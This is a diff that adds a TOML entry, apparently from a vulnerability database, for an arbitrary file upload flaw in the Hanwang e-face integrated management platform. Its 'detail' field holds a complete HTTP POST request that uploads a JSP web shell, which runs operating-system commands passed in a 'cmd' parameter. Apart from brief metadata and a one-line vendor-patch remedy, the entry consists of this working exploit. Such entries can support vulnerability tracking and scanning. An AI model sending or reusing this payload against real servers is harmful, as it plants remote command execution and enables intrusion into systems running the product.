@@ -1,0 +1,16 @@
+vendor = "汉王"
+name = "汉王 e 脸通综合管理平台 uploadMapFile.do 任意文件上传漏洞"
+type = "任意文件上传"
+path = "/manage/visitorMapConfig/uploadMapFile.do"
+version = ""
+detail = """POST /manage/visitorMapConfig/uploadMapFile.do HTTP/1.1 Host: target Content-Type: multipart/form-data; boundary=----Boundary
+
+------Boundary
+Content-Disposition: form-data; name="file"; filename="shell.jsp"
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+------Boundary--"""
+fix = "联系厂商获取补丁"
+date = 20250701
+label = "nday"
+cve = "TVD-2026-XXXXX"
+verifier = "AdySec"
